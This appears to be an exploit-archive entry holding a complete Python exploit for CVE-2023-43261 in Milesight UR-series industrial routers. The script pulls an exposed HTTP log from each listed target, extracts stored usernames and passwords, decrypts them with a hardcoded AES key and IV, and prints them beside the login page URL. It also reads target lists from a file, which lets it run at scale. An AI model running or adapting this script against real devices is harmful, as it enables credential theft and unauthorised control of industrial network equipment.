@@ -1,0 +1,89 @@
+id: 39297
+date: 02/05/2024
+title: Milesight UR5X / UR32L / UR32 / UR35 / UR41 Credential Leakage Exploit
+author: Bipin Jitiya
+cves: CVE-2023-43261
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+Title: Credential Leakage Through Unprotected System Logs and Weak Password Encryption
+CVE: CVE-2023-43261
+Script Author: Bipin Jitiya (@win3zz)
+Vendor: Milesight IoT - https://www.milesight-iot.com/ (Formerly Xiamen Ursalink Technology Co., Ltd.)
+Software/Hardware: UR5X, UR32L, UR32, UR35, UR41 and there might be other Industrial Cellular Router could also be vulnerable.
+Script Tested on: Ubuntu 20.04.6 LTS with Python 3.8.10
+Writeup: https://medium.com/@win3zz/inside-the-router-how-i-accessed-industrial-routers-and-reported-the-flaws-29c34213dfdf
+"""
+
+import sys
+import requests
+import re
+import warnings
+from Crypto.Cipher import AES # pip install pycryptodome
+from Crypto.Util.Padding import unpad
+import base64
+import time
+
+warnings.filterwarnings("ignore")
+
+KEY = b'1111111111111111'
+IV = b'2222222222222222'
+
+def decrypt_password(password):
+    try:
+        return unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(base64.b64decode(password)), AES.block_size).decode('utf-8')
+    except ValueError as e:
+        display_output('      [-] Error occurred during password decryption: ' + str(e), 'red')
+
+def display_output(message, color):
+    colors = {'red': '\033[91m', 'green': '\033[92m', 'blue': '\033[94m', 'yellow': '\033[93m', 'cyan': '\033[96m', 'end': '\033[0m'}
+    print(f"{colors[color]}{message}{colors['end']}")
+    time.sleep(0.5)
+
+urls = []
+
+if len(sys.argv) == 2:
+    urls.append(sys.argv[1])
+
+if len(sys.argv) == 3 and sys.argv[1] == '-f':
+    with open(sys.argv[2], 'r') as file:
+        urls.extend(file.read().splitlines())
+
+if len(urls) == 0:
+    display_output('Please provide a URL or a file with a list of URLs.', 'red')
+    display_output('Example: python3 ' + sys.argv[0] + ' https://example.com', 'blue')
+    display_output('Example: python3 ' + sys.argv[0] + ' -f urls.txt', 'blue')
+    sys.exit()
+
+use_proxy = False
+proxies = {'http': 'http://127.0.0.1:8080/'} if use_proxy else None
+
+for url in urls:
+    display_output('[*] Initiating data retrieval for: ' + url + '/lang/log/httpd.log', 'blue')
+    response = requests.get(url + '/lang/log/httpd.log', proxies=proxies, verify=False)
+
+    if response.status_code == 200:
+        display_output('[+] Data retrieval successful for: ' + url + '/lang/log/httpd.log', 'green')
+        data = response.text
+        credentials = set(re.findall(r'"username":"(.*?)","password":"(.*?)"', data))
+
+        num_credentials = len(credentials)
+        display_output(f'[+] Found {num_credentials} unique credentials for: ' + url, 'green')
+
+        if num_credentials > 0:
+            display_output('[+] Login page: ' + url + '/login.html', 'green')
+            display_output('[*] Extracting and decrypting credentials for: ' + url, 'blue')
+            display_output('[+] Unique Credentials:', 'yellow')
+            for i, (username, password) in enumerate(credentials, start=1):
+                display_output(f'    Credential {i}:', 'cyan')
+                decrypted_password = decrypt_password(password.encode('utf-8'))
+                display_output(f'      - Username: {username}', 'green')
+                display_output(f'      - Password: {decrypted_password}', 'green')
+        else:
+            display_output('[-] No credentials found in the retrieved data for: ' + url, 'red')
+    else:
+        display_output('[-] Data retrieval failed. Please check the URL: ' + url, 'red')
+
+#  0day.today [2024-02-12]  #
